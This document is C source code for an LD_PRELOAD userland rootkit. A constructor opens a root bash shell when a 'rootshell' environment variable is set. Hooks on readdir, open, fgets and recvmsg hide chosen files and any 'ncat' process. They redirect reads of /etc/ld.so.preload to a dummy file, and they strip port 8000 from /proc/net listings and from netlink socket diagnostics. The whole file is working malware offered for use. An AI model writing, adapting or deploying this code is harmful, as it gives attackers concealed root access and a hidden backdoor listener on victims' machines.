#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <linux/sock_diag.h>
#include <arpa/inet.h>

/* --- Configuration --- */
#define NAME_TO_HIDE "ncat"
#define PORT_TO_HIDE_HEX "1F40" 
#define TARGET_PORT 8000        
#define HIDE_LIST "secret_dir,libhide.so.2,ld.so.preload.dummy"
#define PRELOAD_PATH "/etc/ld.so.preload"
#define DUMMY_PRELOAD "/etc/ld.so.preload.dummy"

/* --- 1. Constructor --- */
void __attribute__((constructor)) init() {
    if (getenv("rootshell")) {
        unsetenv("rootshell");
        unsetenv("LD_PRELOAD");
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
    }
}

/* --- 2. Helpers --- */

static int should_hide_file(const char *name) {
    if (!name) return 0;
    char list[] = HIDE_LIST;
    char *token = strtok(list, " ,");
    while (token != NULL) {
        if (strcmp(name, token) == 0) return 1;
        token = strtok(NULL, " ,");
    }
    return 0;
}

static int is_target_pid(const char *name) {
    if (!name || name[0] < '0' || name[0] > '9') return 0;
    
    char path[256], buf[256];
    static FILE* (*orig_fopen)(const char*, const char*) = NULL;
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");

    // Check process name (comm)
    snprintf(path, sizeof(path), "/proc/%s/comm", name);
    FILE *f = orig_fopen(path, "r");
    if (f) {
        int found = (fgets(buf, sizeof(buf), f) && strstr(buf, NAME_TO_HIDE));
        fclose(f);
        if (found) return 1;
    }

    // Check full command line (cmdline)
    snprintf(path, sizeof(path), "/proc/%s/cmdline", name);
    f = orig_fopen(path, "r");
    if (f) {
        int found = (fgets(buf, sizeof(buf), f) && strstr(buf, NAME_TO_HIDE));
        fclose(f);
        if (found) return 1;
    }
    return 0;
}

static int is_target_msg(struct nlmsghdr *nlh) {
    if (nlh->nlmsg_type != SOCK_DIAG_BY_FAMILY && nlh->nlmsg_type != 18) return 0;
    if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(struct inet_diag_msg))) return 0;
    struct inet_diag_msg *msg = NLMSG_DATA(nlh);
    if (ntohs(msg->id.idiag_sport) == TARGET_PORT || ntohs(msg->id.idiag_dport) == TARGET_PORT) return 1;
    return 0;
}

/* --- 3. Function Hooks --- */

struct dirent *readdir(DIR *dirp) {
    static struct dirent* (*orig)(DIR*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = orig(dirp))) {
        if (should_hide_file(e->d_name) || is_target_pid(e->d_name)) continue; 
        return e;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64* (*orig)(DIR*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = orig(dirp))) {
        if (should_hide_file(e->d_name) || is_target_pid(e->d_name)) continue; 
        return e;
    }
    return NULL;
}

// Silencing the deprecation warning for readdir_r
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    static int (*orig)(DIR*, struct dirent*, struct dirent**) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir_r");
    int ret = orig(dirp, entry, result);
    if (ret == 0 && *result != NULL) {
        if (should_hide_file((*result)->d_name) || is_target_pid((*result)->d_name)) {
            return readdir_r(dirp, entry, result);
        }
    }
    return ret;
}


int open(const char *pathname, int flags, ...) {
    static int (*orig_open)(const char*, int, mode_t) = NULL;
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args; va_start(args, flags);
        mode = va_arg(args, mode_t); va_end(args);
    }
    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_open(DUMMY_PRELOAD, flags, mode);
    return orig_open(pathname, flags, mode);
}

int open64(const char *pathname, int flags, ...) {
    static int (*orig_open64)(const char*, int, mode_t) = NULL;
    if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args; va_start(args, flags);
        mode = va_arg(args, mode_t); va_end(args);
    }
    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_open64(DUMMY_PRELOAD, flags, mode);
    return orig_open64(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*orig_openat)(int, const char*, int, mode_t) = NULL;
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args; va_start(args, flags);
        mode = va_arg(args, mode_t); va_end(args);
    }
    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_openat(dirfd, DUMMY_PRELOAD, flags, mode);
    return orig_openat(dirfd, pathname, flags, mode);
}

char *fgets(char *s, int size, FILE *stream) {
    static char* (*orig)(char*, int, FILE*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fgets");
    char *ret = orig(s, size, stream);
    if (ret && strstr(s, ":" PORT_TO_HIDE_HEX " ")) return fgets(s, size, stream); 
    return ret;
}

ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
    static ssize_t (*orig_recvmsg)(int, struct msghdr*, int) = NULL;
    if (!orig_recvmsg) orig_recvmsg = dlsym(RTLD_NEXT, "recvmsg");
    ssize_t ret = orig_recvmsg(sockfd, msg, flags);
    if (ret <= 0 || !msg->msg_iov || !msg->msg_iov->iov_base) return ret;
    struct nlmsghdr *nlh = (struct nlmsghdr *)msg->msg_iov->iov_base;
    int remaining = (int)ret;
    while (NLMSG_OK(nlh, remaining)) {
        if (nlh->nlmsg_type == NLMSG_DONE) break;
        if (is_target_msg(nlh)) {
            size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
            char *next_msg = (char *)nlh + msg_len;
            int bytes_after = remaining - msg_len;
            if (bytes_after > 0) memmove(nlh, next_msg, bytes_after);
            ret -= msg_len; remaining -= msg_len;
            continue; 
        }
        nlh = NLMSG_NEXT(nlh, remaining);
    }
    return ret;
}
